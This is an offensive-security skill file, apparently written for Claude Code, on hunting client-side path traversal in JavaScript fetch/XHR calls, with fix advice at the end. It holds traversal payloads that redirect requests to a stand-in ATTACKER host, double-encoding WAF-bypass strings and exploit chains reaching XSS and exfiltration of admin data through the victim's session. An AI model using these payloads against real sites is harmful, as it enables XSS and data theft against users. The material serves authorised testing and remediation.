---
name: cspt
description: >
  Use when hunting Client-Side Path Traversal (CSPT) vulnerabilities where attacker-
  controlled input is unsafely concatenated into the path component of a JavaScript
  fetch() or XHR request. Trigger on: "CSPT", "client-side path traversal",
  "fetch path traversal", "XHR path injection", "fetch concatenation", "../ in fetch",
  "user input in fetch URL", "path component injection", fetch redirect chaining,
  CSPT to XSS, open redirect fetch, "JavaScript fetch user input", DOM fetch injection.
license: MIT
compatibility: Designed for Claude Code. Burp Suite recommended for active testing.
metadata:
  category: client-side
  version: "0.1"
  source: https://matanber.com/blog/cspt-levels
  source_types: blog_post
---

# Client-Side Path Traversal (CSPT)

## What Is Broken and Why

Client-Side Path Traversal occurs when attacker-controlled input is concatenated
directly into the path component of a JavaScript `fetch()` or `XHR` URL without
proper encoding. The injected `../` sequences traverse the URL path, redirecting
the request to an unintended endpoint. Unlike server-side path traversal (which
reads files), CSPT redirects API calls — enabling response injection, data exfiltration,
and XSS when chained with an open redirect that `fetch()` auto-follows to an
attacker-controlled domain.

## Key Signals

- JavaScript source with user-controlled input concatenated into a fetch/XHR path:
  ```js
  fetch("/api/users/" + userId + "/profile")
  fetch(`/api/posts/${postId}/comments`)
  xhr.open("GET", "/api/data/" + param)
  ```
- Input lands in the **path** segment (before `?`), not the query string
- No `encodeURIComponent()` wrapping the input, or encoding applied only to specific chars
- Application has open redirect endpoints (`/redirect?u=`, `/oauth/authorize?redirect_uri=`)
- SPA frameworks where routing inputs feed directly into API calls
- Response content is rendered as HTML or passed to `innerHTML` / `eval()`

## Methodology

1. Map all `fetch()` / `XHR` calls in JavaScript source — look for string concatenation in the URL path.
2. Identify which parameters control the path segment (not query string).
3. Test basic traversal: inject `../../../anything` — did the request path change?
4. Determine depth needed: count path segments to traverse to root or to a useful endpoint.
5. Find a usable gadget endpoint — open redirect (`/redirect?u=ATTACKER`) or any endpoint whose response is reflected in the DOM.
6. Craft final payload: traverse to the gadget, chain to attacker-controlled response.
7. If WAF blocks, apply encoding bypass strategy (see table below).
8. Confirm XSS or data exfiltration via OOB callback.

### WAF Bypass: Encoding Level Matrix

| Situation | Strategy | Example |
|---|---|---|
| No WAF | Use plain `../` | `../../../gadget` |
| WAF level = App level | Encode dots: `%2e%2e/` | `%2e%2e/%2e%2e/%2e%2easdf` |
| WAF level < App level | Over-encode slashes | `..%252f..%252f..%252fasdf` |
| WAF level > App level | Pad with dummy segments | `a%252fa%252fa%252fa/../../../../asdf` |

**Depth** = (number of path segments) − (number of `../` sequences).
WAFs check that depth never goes negative. Pad to keep WAF depth ≥ 0 while making app depth < 0.

## Payloads & Tools

```js
// Basic CSPT test — confirm path traversal in fetch
fetch("/api/users/../../../anything")
// → request goes to /anything

// Traverse to open redirect gadget for XSS
// Target app has: /redirect?u=<URL> → 302 to URL
// fetch() auto-follows redirects by default
fetch("/api/users/../../../../redirect?u=https://ATTACKER/evil.json")
// → fetch follows redirect → attacker controls response

// Depth calculation example
// Vulnerable URL: /api/users/{id}/profile
// Segments above id: 3 (/api/users/profile)
// Need 3 x "../" to reach root
payload = "../../../redirect?u=https://ATTACKER/payload"
```

```
# WAF bypass payloads (equal encoding levels — encode dots)
%2e%2e/%2e%2e/%2e%2eredirect?u=https://ATTACKER

# WAF level < App level (double-encode slash)
..%252f..%252f..%252fredirect?u=https://ATTACKER

# WAF level > App level (pad with dummy segments WAF decodes away)
a%252fa%252fa%252fa/../../../redirect?u=https://ATTACKER
```

```bash
# Burp: intercept, modify path param, inject traversal sequences
# Search JS source for fetch/XHR concatenation patterns
grep -rn 'fetch(\|xhr.open\|axios.get\|axios.post' src/ | grep '+'
grep -rn 'fetch(`\|fetch("' src/ | grep '\${'
```

## Bypass Techniques

- **`%2e%2e/` instead of `../`**: browser normalizes `%2e` to `.` — functionally identical but bypasses string-match WAFs
- **Double-encoded slash** (`%252f`): WAF decodes once → `%2f` (safe-looking); app/browser decodes again → `/` (traversal)
- **Mixed encoding**: combine `%2e%2e` with `%252f`: `%2e%2e%252f` — confuses WAFs that check for specific patterns
- **Null byte / fragment**: some implementations stop path processing at `%00` or `#` — may truncate WAF's depth check
- **Redirect chain**: if direct domain SSRF is blocked, chain through multiple open redirects on trusted domains
- **`fetch()` redirect modes**: `fetch(url, {redirect: 'follow'})` is default — attacker's redirect is automatically followed including cross-origin

## Exploitation Scenarios

**Scenario 1 — CSPT → Open Redirect → XSS**
Setup: SPA fetches user content via `fetch("/api/posts/" + postId)` and renders the JSON response into the DOM.
App also has `/oauth/redirect?to=<URL>` open redirect endpoint.
Trigger: Attacker sets `postId = "../../../../oauth/redirect?to=https://ATTACKER/evil.json"`.
Impact: `fetch()` follows redirect to attacker's server → attacker returns crafted JSON with XSS payload → app renders it into DOM → stored or reflected XSS.

**Scenario 2 — CSPT for internal endpoint access**
Setup: Frontend fetches `/api/v1/users/{id}/settings` — `id` comes from URL hash fragment without encoding.
Internal endpoint `/api/v1/admin/config` is not accessible from outside but is reachable server-side.
Trigger: Attacker injects `../../../../admin/config` as the `id`.
Impact: `fetch()` sends request to `/api/v1/admin/config` with the victim's session cookie — response returned to attacker via XSS gadget or exfiltrated.

**Scenario 3 — WAF bypass via encoding mismatch**
Setup: WAF decodes once before depth-checking; app passes encoded URL to browser which decodes twice.
Trigger: Attacker uses `..%252f..%252f..%252fredirect?u=https://ATTACKER` — WAF sees `..%2f..%2f..%2fredirect` (depth 0, benign); browser sees `../../../redirect` (traversal).
Impact: WAF passes the request; browser executes traversal; open redirect reached; XSS achieved.

## False Positives

- Input lands in query string (`?id=../..`) not path — server routing ignores it, no traversal
- `encodeURIComponent()` wraps the input — `../` becomes `..%2F` which browsers do NOT normalize back in the path
- Fetch request targets a static file server that doesn't serve sensitive endpoints at the traversed path
- Response is not rendered or used in any DOM-modifying operation — traversal has no impact

## Fix Patterns

```js
// WRONG: direct concatenation into path
fetch("/api/posts/" + postId + "/comments")

// CORRECT: encode the input — encodeURIComponent prevents traversal
fetch("/api/posts/" + encodeURIComponent(postId) + "/comments")

// CORRECT: validate input is a safe identifier (no slashes or dots)
if (!/^[a-zA-Z0-9_-]+$/.test(postId)) throw new Error("Invalid ID");
fetch("/api/posts/" + postId + "/comments")
```

- Always apply `encodeURIComponent()` to user-controlled values inserted into URL paths
- Validate that path parameters match expected format (alphanumeric IDs, UUIDs) before use
- Do not rely on WAF depth-checking alone — fix at the source
- Audit all `fetch()`/XHR calls where the URL is constructed via string concatenation or template literals with user input

## Related Skills

[[dom-xss]] is the most common impact of CSPT: the path traversal redirects `fetch()` to an attacker-controlled URL that returns a payload rendered into a dangerous DOM sink like `innerHTML`. [[csrf]] is another direct chain — CSPT can redirect a form's fetch target to change the endpoint a state-changing submission hits, effectively forging the destination of an authenticated request. The WAF encoding bypass matrix here parallels [[path-traversal]] encoding techniques, since both exploit URL normalization disagreements between parser layers.
